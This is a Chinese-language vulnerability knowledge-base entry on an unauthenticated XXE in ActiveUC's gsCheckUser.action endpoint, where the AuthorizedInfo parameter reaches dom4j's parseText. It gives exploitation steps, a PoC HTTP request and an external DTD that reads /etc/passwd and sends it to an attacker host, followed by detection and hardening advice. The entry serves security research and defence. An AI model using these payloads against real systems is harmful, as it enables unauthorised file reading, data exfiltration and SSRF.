---
id: web-java-component-activeuc-gscheckuser-dom4j-xxe
title: 网动 ActiveUC gsCheckUser 未鉴权 XXE：AuthorizedInfo 直入 dom4j DocumentHelper.parseText
type: scenario
domain: web
path: web/java/component
technique: activeuc-gscheckuser-dom4j-xxe
aliases:
- ActiveUC XXE
- gsCheckUser XXE
- AuthorizedInfo XXE
- dom4j DocumentHelper.parseText
- 网动统一通信平台
- 前台 XXE
tags:
- java
- activeuc
- struts2
- xxe
- dom4j
- unauth
- component
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V195
  verified_at: '2026-11-06T23:12:01+08:00'
  notes: 已对照原文核对；AuthorizedInfo→DocumentHelper.parseText 与 acenter_index extends global 一致；原文为 OOB DTD PoC，无回连截图。
---

## 一句话结论

ActiveUC 的 `gsCheckUser.action` 位于未继承鉴权拦截器的 `acenter_index` package，`CheckUserAction.execute()` 直接把请求参数 `AuthorizedInfo` 传给 dom4j 的 `DocumentHelper.parseText(strInfo)`；解析器未禁用 DOCTYPE/外部实体，攻击者可前台提交外部实体 XML，通过外部 DTD 回连实现 OOB XXE（文件读取/SSRF）。

## 原理

- **入口可控**：`CheckUserAction.execute()`：
  ```java
  String strInfo = this.getParameter("AuthorizedInfo", "");
  if (strInfo != null && !"".equals(strInfo)) {
      Document dom = DocumentHelper.parseText(strInfo);
      Element root = dom.getRootElement();
      Iterator userIdIter = root.elementIterator("UserId");
      ...
  }
  ```
  `getParameter` 直接读取请求参数，未做 XML 过滤/长度限制。
- **sink 默认不安全**：dom4j 的 `DocumentHelper.parseText` 内部创建 `SAXReader`，默认没有设置 `disallow-doctype-decl`、`external-general-entities`、`external-parameter-entities` 等防护；XML 中的 `<!DOCTYPE ... [<!ENTITY % remote SYSTEM "http://attacker/evil.dtd"> %remote;]>` 会被解析，外部 DTD 可定义实体读取本地文件或发起 HTTP 请求。
- **未鉴权**：`struts.xml` 中 `gsCheckUser` 定义在 `acenter_index` package（`extends="global"`），该 package 只有 `PagerFilter`/`ExceptionInterception`，没有 `globalAndVerify` 的 `VerifyLogInfoInterceptor`；`CheckUserAction` 代码中也没有 session 校验，故前台可触发。
- **OOB 必要性**：解析结果被用于 `elementIterator("UserId")` 等业务逻辑，直接回显文件内容不一定可行；外部 DTD 可把文件内容拼进 URL 参数/子域名回连攻击者服务器，或直接发起内网 HTTP 请求（SSRF）。
- **为什么成立**：XXE 的本质是 XML 解析器允许文档定义外部实体并在解析时解析 SYSTEM 标识的资源；默认配置的 dom4j 正是如此，输入可控即可把“解析 XML”变成“读文件/发请求”。

## 触发条件

- 目标为 ActiveUC，存在 `gsCheckUser.action` 且所在 package 未继承鉴权拦截器。
- `AuthorizedInfo` 参数可控且被直接传入 `DocumentHelper.parseText`。
- dom4j/SAX 解析器未禁用 DOCTYPE 与外部实体（默认配置即满足；若应用全局加固则不成立）。
- 目标可出网访问攻击者 HTTP/DNS（OOB），或可访问内网目标（SSRF）。
- 应用进程对目标文件有读权限。

## 利用步骤

1. 确认 `POST /acenter/gsCheckUser.action` 无需登录可访问。
2. 在攻击者服务器放置外部 DTD，定义参数实体读取目标文件并拼进回连 URL；或直接定义外部实体指向 `file:///etc/passwd`。
3. 提交 `AuthorizedInfo` 为带外部 DTD 的 XML（URL 编码）。
4. 观察攻击者 HTTP/DNS 日志中的回连与文件内容；若无回连，改用内网地址测试 SSRF。
5. 授权测试只读取无害文件/回连到自控域名，不触碰生产数据。

## PoC

解码后的 XML 结构（示意）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker/evil.dtd">
  %remote;
]>
<root>
  <UserId>&xxe;</UserId>
</root>
```

攻击者 `evil.dtd`（示意）：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?d=%file;'>">
%eval;
%exfil;
```

原文 PoC 为 URL 编码后的 `AuthorizedInfo`：

```http
POST /acenter/gsCheckUser.action HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

AuthorizedInfo=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22...
```

（原文 payload 使用 `%remote;` 指向 `http://yfjeg1o3.requestrepo.com` 做 OOB 验证。）

关键源码：

```java
String strInfo = this.getParameter("AuthorizedInfo", "");
Document dom = null;
try {
    if (strInfo != null && !"".equals(strInfo)) {
        dom = DocumentHelper.parseText(strInfo);
        Element root = dom.getRootElement();
        Iterator userIdIter = root.elementIterator("UserId");
        ...
```

## 变体与关联

- 外部 DTD 可做文件读取（`file://`）、SSRF（`http://internal/`）、DNS 外带；无出网时可尝试错误回显/盲注。
- 若 `DocumentHelper.parseText` 被全局加固，可寻找其它未加固的 XML 解析点（`SAXReader`、`XMLReader`、`DocumentBuilder`）。
- 关联：[[web-generic-xxe-dom4j-parsemodxmlstr-inband-read]]（dom4j `DocumentHelper.parseText` 的通用 XXE 原理与另一案例）。

## 检测与防御

- 解析 XML 前禁用 DOCTYPE 与外部实体：`SAXReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`，关闭 `external-general-entities`/`external-parameter-entities`，或使用安全的 `DocumentBuilderFactory` 配置。
- `AuthorizedInfo` 做严格格式校验（签名/加密/固定 schema），不要把原始 XML 直接交给解析器。
- `gsCheckUser` 等前台接口加鉴权或来源校验；统一 package 鉴权，避免 `extends="global"` 遗漏。
- 限制应用出网与内网访问；监控 XML 参数中的 `<!DOCTYPE`、`SYSTEM`、`ENTITY`、`%remote` 等特征。
- 日志/IDS 检测 `gsCheckUser.action` 携带外部 DTD URL 或异常 XML 的请求。
